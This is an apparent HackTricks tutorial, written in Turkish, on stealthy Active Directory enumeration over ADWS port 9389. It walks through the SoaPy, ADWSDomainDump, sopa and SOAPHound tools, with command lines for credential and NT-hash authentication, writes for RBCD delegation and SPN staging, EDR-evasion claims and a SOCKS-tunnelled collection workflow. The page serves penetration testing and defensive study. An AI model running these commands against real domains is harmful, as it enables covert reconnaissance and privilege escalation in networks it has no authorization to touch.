# Active Directory Web Services (ADWS) Enumeration ve Gizli Toplama

{{#include ../../banners/hacktricks-training.md}}

## ADWS nedir?

Active Directory Web Services (ADWS), **Windows Server 2008 R2'den beri her Domain Controller'da varsayılan olarak etkindir** ve TCP **9389** portunu dinler.  Adına rağmen **HTTP kullanılmaz**.  Bunun yerine servis, LDAP tarzı verileri özel .NET framing protokollerinden oluşan bir stack üzerinden sunar:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Trafik bu binary SOAP frame'leri içine encapsulate edildiği ve yaygın olmayan bir port üzerinden iletildiği için **ADWS üzerinden yapılan enumeration'ın classic LDAP/389 ve 636 trafiğine kıyasla incelenme, filtrelenme veya signature ile tespit edilme olasılığı çok daha düşüktür**.  Operatörler açısından bunun anlamı şudur:<sup>[[1]](#references)[[7]](#references)</sup>

* Daha gizli recon – Blue team'ler genellikle LDAP query'lerine odaklanır.
* **Windows dışı host'lardan (Linux, macOS)** SOCKS proxy üzerinden 9389/TCP tunnelling yaparak collection özgürlüğü.
* LDAP üzerinden elde edebileceğiniz verilerin aynısı (users, groups, ACLs, schema vb.) ve **write** işlemleri gerçekleştirme yeteneği (ör. **RBCD** için `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS etkileşimleri WS-Enumeration üzerinden uygulanır: her query, LDAP filter/attributes'ı tanımlayan bir `Enumerate` message ile başlar ve bir `EnumerationContext` GUID döndürür; ardından server tarafından tanımlanan result window'a kadar sonuçları stream eden bir veya daha fazla `Pull` message gelir.<sup>[[7]](#references)</sup> Context'ler yaklaşık 30 dakika sonra sona erer; bu nedenle tooling'in state kaybını önlemek için sonuçları page etmesi veya filter'ları bölmesi (CN başına prefix query'leri) gerekir.<sup>[[8]](#references)</sup> Security descriptor'lar istenirken SACL'leri hariç tutmak için `LDAP_SERVER_SD_FLAGS_OID` control'ünü belirtin; aksi takdirde ADWS `nTSecurityDescriptor` attribute'unu SOAP response'undan basitçe kaldırır.

> NOTE: ADWS birçok RSAT GUI/PowerShell tool'u tarafından da kullanılır; bu nedenle trafik legitimate admin activity ile karışabilir.

## SoaPy – Native Python İstemcisi

[SoaPy](https://github.com/logangoins/soapy), **ADWS protocol stack'inin pure Python ile geliştirilmiş eksiksiz bir re-implementation'ıdır**.  NBFX/NBFSE/NNS/NMF frame'lerini byte-by-byte oluşturur ve .NET runtime'a dokunmadan Unix-like system'lerden collection yapılmasını sağlar.<sup>[[1]](#references)[[2]](#references)</sup>

### Temel Özellikler

* **SOCKS üzerinden proxying** desteği (C2 implant'larından kullanım için faydalıdır).
* LDAP `-q '(objectClass=user)'` ile aynı fine-grained search filter'ları.
* İsteğe bağlı **write** işlemleri (`--set` / `--delete`).
* BloodHound'a doğrudan ingestion için **BOFHound output mode**.<sup>[[3]](#references)</sup>
* İnsan tarafından okunabilirliğin gerektiği durumlarda timestamp'leri / `userAccountControl`'ü daha anlaşılır hale getirmek için `--parse` flag'i.<sup>[[2]](#references)</sup>

### Hedefli collection flag'leri ve write işlemleri

SoaPy, en yaygın LDAP hunting görevlerini ADWS üzerinden taklit eden, önceden hazırlanmış switch'lerle birlikte gelir: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`; ayrıca özel pull'lar için raw `--query` / `--filter` seçenekleri bulunur.  Bunları `--rbcd <source>` (`msDs-AllowedToActOnBehalfOfOtherIdentity` ayarlar), `--spn <service/cn>` (hedefli Kerberoasting için SPN staging'i) ve `--asrep` (`userAccountControl` içindeki `DONT_REQ_PREAUTH` değerini değiştirir) gibi write primitive'leriyle birlikte kullanın.<sup>[[2]](#references)</sup>

Yalnızca `samAccountName` ve `servicePrincipalName` döndüren hedefli bir SPN hunt örneği:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Aynı host/credentials bilgilerini kullanarak bulguları hemen weaponise edin: `--rbcds` ile RBCD-capable nesneleri dump edin, ardından bir Resource-Based Constrained Delegation zinciri hazırlamak için `--rbcd 'WEBSRV01$' --account 'FILE01$'` uygulayın (tam abuse path için [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) bölümüne bakın).

### Kurulum (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – Linux/Windows üzerinde ADWS üzerinden LDAPDomainDump

* LDAP sorgularını TCP/9389 üzerindeki ADWS çağrılarıyla değiştirerek LDAP-signature tespitlerini azaltan `ldapdomaindump` fork'u.
* `--force` verilmediği sürece 9389 için ilk erişilebilirlik denetimini gerçekleştirir (port taramaları gürültülü/filtrelenmişse probe'u atlar).
* Microsoft Defender for Endpoint ve CrowdStrike Falcon üzerinde test edilmiş ve README'de başarılı bypass bildirilmiştir.<sup>[[4]](#references)</sup>

### Kurulum
```bash
pipx install .
```
### Kullanım
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipik çıktı, 9389 erişilebilirlik kontrolünü, ADWS bind işlemini ve dump başlangıç/bitişini günlüğe kaydeder:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang'de ADWS için pratik bir client

soapy'ye benzer şekilde [sopa](https://github.com/Macmod/sopa), ADWS protokol yığınını (MS-NNS + MC-NMF + SOAP) Golang'de uygular ve aşağıdaki gibi ADWS çağrıları yapmak için komut satırı flag'leri sunar:<sup>[[5]](#references)</sup>

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` ve `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* ve `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` gibi diğerleri

### Protocol mapping highlights

* LDAP tarzı aramalar, attribute projection, scope kontrolü (Base/OneLevel/Subtree) ve pagination ile **WS-Enumeration** (`Enumerate` + `Pull`) üzerinden gerçekleştirilir.
* Tek bir object fetch işlemi **WS-Transfer** `Get` kullanır; attribute değişiklikleri `Put`, silme işlemleri ise `Delete` kullanır.
* Yerleşik object oluşturma işlemi **WS-Transfer ResourceFactory** kullanır; custom object'ler ise YAML template'leri tarafından yönlendirilen bir **IMDA AddRequest** kullanır.
* Password işlemleri **MS-ADCAP** action'larıdır (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Unauthenticated metadata discovery (mex)

ADWS, credential olmadan WS-MetadataExchange sunar. Bu, authenticate olmadan önce exposure'ı doğrulamak için hızlı bir yöntemdir:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery & Kerberos targeting notes

`--dc` belirtilmez ve `--domain` sağlanırsa Sopa, SRV üzerinden DC'leri çözümleyebilir. Aşağıdaki sırayla sorgulama yapar ve en yüksek önceliğe sahip hedefi kullanır:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operasyonel olarak, segmentlere ayrılmış ortamlarda hataları önlemek için DC tarafından kontrol edilen bir resolver kullanın:

* `--dns <DC-IP>` kullanarak **tüm** SRV/PTR/forward lookup işlemlerinin DC DNS üzerinden yapılmasını sağlayın.
* UDP engellendiğinde veya SRV yanıtları büyük olduğunda `--dns-tcp` kullanın.
* Kerberos etkinse ve `--dc` bir IP adresiyse, sopa doğru SPN/KDC hedeflemesi için bir FQDN elde etmek amacıyla **reverse PTR** gerçekleştirir. Kerberos kullanılmıyorsa PTR lookup yapılmaz.

Örnek (IP + Kerberos, DC üzerinden zorunlu DNS):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Kimlik doğrulama materyali seçenekleri

Düz metin parolaların yanı sıra sopa, ADWS kimlik doğrulaması için **NT hashes**, **Kerberos AES keys**, **ccache** ve **PKINIT certificates** (PFX veya PEM) destekler. `--aes-key`, `-c` (ccache) veya sertifika tabanlı seçenekler kullanıldığında Kerberos otomatik olarak kullanılır.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Şablonlar aracılığıyla özel nesne oluşturma

Arbitrary object classes için `create custom` komutu, bir IMDA `AddRequest` nesnesine eşlenen YAML şablonunu kullanır:<sup>[[5]](#references)</sup>

* `parentDN` ve `rdn`, container'ı ve relative DN'yi tanımlar.
* `attributes[].name`, `cn` veya namespace içeren `addata:cn` değerini destekler.
* `attributes[].type`, `string|int|bool|base64|hex` veya açık bir `xsd:*` değerini kabul eder.
* `ad:relativeDistinguishedName` ya da `ad:container-hierarchy-parent` eklemeyin; sopa bunları ekler.
* `hex` değerleri `xsd:base64Binary` olarak dönüştürülür; boş string ayarlamak için `value: ""` kullanın.

## SOAPHound – Yüksek Hacimli ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound), tüm LDAP etkileşimlerini ADWS içinde tutan ve BloodHound v4 uyumlu JSON çıktısı üreten bir .NET collector'dır. Bir kez (`--buildcache`) `objectSid`, `objectGUID`, `distinguishedName` ve `objectClass` için eksiksiz bir cache oluşturur; ardından yüksek hacimli `--bhdump`, `--certdump` (ADCS) veya `--dnsdump` (AD-integrated DNS) işlemlerinde bu cache'i yeniden kullanır. Böylece DC'den yalnızca yaklaşık 35 kritik attribute ayrılır. AutoSplit (`--autosplit --threshold <N>`), büyük forest'larda 30 dakikalık EnumerationContext timeout sınırının altında kalmak için sorguları CN prefix'ine göre otomatik olarak parçalara ayırır.<sup>[[8]](#references)</sup>

Domain'e join edilmiş bir operator VM üzerindeki tipik workflow:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Export edilen JSON slot’larını doğrudan SharpHound/BloodHound workflows içine aktarın — downstream graphing fikirleri için [BloodHound methodology](bloodhound.md) sayfasına bakın. AutoSplit, sorgu sayısını ADExplorer tarzı snapshot’lara kıyasla düşük tutarken SOAPHound’un multi-million object forest’larda dayanıklı olmasını sağlar.

## Stealth AD Collection Workflow

Aşağıdaki workflow, **domain & ADCS objects** öğelerinin ADWS üzerinden nasıl enumerate edileceğini, BloodHound JSON formatına dönüştürüleceğini ve certificate-based attack path’lerin nasıl hunt edileceğini gösterir — tüm bunlar Linux üzerinden gerçekleştirilir:

1. Hedef network’ten kendi makinenize **9389/TCP tüneli** oluşturun (ör. Chisel, Meterpreter, SSH dynamic port-forward vb. ile). `export HTTPS_PROXY=socks5://127.0.0.1:1080` komutunu çalıştırın veya SoaPy’nin `--proxyHost/--proxyPort` seçeneklerini kullanın.

2. **Root domain object’i toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC'den ADCS ile ilgili nesneleri toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound'a dönüştür:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. BloodHound GUI'de **ZIP'i yükleyin** ve sertifika yükseltme yollarını (ESC1, ESC8 vb.) ortaya çıkarmak için `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorgularını çalıştırın.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) Yazma
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Bunu tam bir **Resource-Based Constrained Delegation** zinciri için `s4u2proxy`/`Rubeus /getticket` ile birleştirin (bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Tooling Summary

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, okuma/yazma |
| Yüksek hacimli ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modları |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch loglarını dönüştürür |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Aynı SOCKS üzerinden proxy ile kullanılabilir |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Bilinen ADWS endpoint'leriyle interface kurmak için generic client - enumeration, object creation, attribute modifications ve password changes işlemlerine olanak tanır |

## References

- [1] [SpecterOps – SOAP(y) Kullanmayı Unutmayın – ADWS Kullanarak Gizli AD Toplama İçin Operatör Rehberi](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF spesifikasyonları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS Üzerinden Active Directory Ortamlarının Gizli Enumeration'ı](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS Üzerinden Active Directory Verilerini Toplamak İçin SOAPHound Aracı](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
